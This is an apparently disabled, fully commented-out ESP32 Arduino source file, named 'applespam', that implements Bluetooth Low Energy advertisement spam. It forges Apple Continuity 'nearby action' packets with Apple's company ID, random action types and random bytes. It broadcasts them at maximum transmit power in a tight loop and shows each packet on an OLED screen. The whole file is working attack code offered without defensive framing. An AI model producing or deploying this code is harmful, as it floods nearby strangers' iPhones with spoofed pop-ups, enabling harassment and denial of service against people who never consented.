// #include "include.h"
// #include "BT/applespam.h"

// extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C display;

// BLEAdvertising* Advertising;
// uint8_t packet[17];

// #define MAX_LINES 8
// String lines[MAX_LINES];
// int currentLine = 0;
// int lineNumber = 1;

// #define LED_PIN     26
// #define NUM_LEDS    1
// #define BRIGHTNESS  40
// Adafruit_NeoPixel appleSpamLED(NUM_LEDS, LED_PIN, NEO_GRB + NEO_KHZ800);

// BLEAdvertisementData getOAdvertisementData() {
//     BLEAdvertisementData advertisementData = BLEAdvertisementData();
//     uint8_t i = 0;

//     packet[i++] = 16;   // Length
//     packet[i++] = 0xFF; // Type
//     packet[i++] = 0x4C; // Company  ID
//     packet[i++] = 0x00; // ...
//     packet[i++] = 0x0F; // Type
//     packet[i++] = 0x05; // Length
//     packet[i++] = 0xC1; // Action   flags
//     const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    
//     packet[i++] = types[rand() % sizeof(types)];
//     esp_fill_random(&packet[i], 3);
//     i += 3;
//     packet[i++] = 0x00;
//     packet[i++] = 0x00;
//     packet[i++] = 0x10;
//     esp_fill_random(&packet[i], 3);

//     advertisementData.addData(std::string((char *)packet, 17));

//     return advertisementData;
// }

// void updateSpamDisplay() {
//     display.clearBuffer();
//     for (int i = 0; i < MAX_LINES; i++) {
//         display.setCursor(0, (i + 1) * 12);
//         display.print(lines[i]);
//     }

//     display.sendBuffer();
// }

// void addLineToDisplay(String newLine) {
//     for (int i = 0; i < MAX_LINES - 1; i++) {
//         lines[i] = lines[i + 1];
//     }
//     lines[MAX_LINES - 1] = newLine;

//     updateSpamDisplay();
// }

// void displayAdvertisementData() {
//     String lineStr = String(lineNumber) + ": ";
//     lineNumber++;
//     String dataStr = "0x";
//     dataStr += String(packet[1], HEX);
//     dataStr += ",0x";
//     dataStr += String(packet[2], HEX);
//     dataStr += String(packet[3], HEX);
//     dataStr += ",0x";
//     dataStr += String(packet[7], HEX);

//     addLineToDisplay(lineStr + dataStr);
// }

// void applespamSetup() {
//     appleSpamLED.begin();
//     appleSpamLED.setBrightness(BRIGHTNESS);
//     appleSpamLED.setPixelColor(0, appleSpamLED.Color(150, 0, 0));
//     appleSpamLED.show();

//     display.begin();
//     display.clearBuffer();
//     display.setFont(u8g2_font_profont11_tf);

//     BLEDevice::init("");

//     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
//     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
//     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

//     BLEServer* pServer = BLEDevice::createServer();

//     Advertising = pServer->getAdvertising();
// }

// void applespamLoop() {
//     delay(40);
//     BLEAdvertisementData advertisementData = getOAdvertisementData();
//     Advertising->setAdvertisementData(advertisementData);
//     Advertising->start();
//     displayAdvertisementData();
//     delay(20);
//     Advertising->stop();

//     appleSpamLED.setPixelColor(0, appleSpamLED.Color(0, 0, 150));
//     appleSpamLED.show();

//     appleSpamLED.clear();
//     appleSpamLED.show();
// }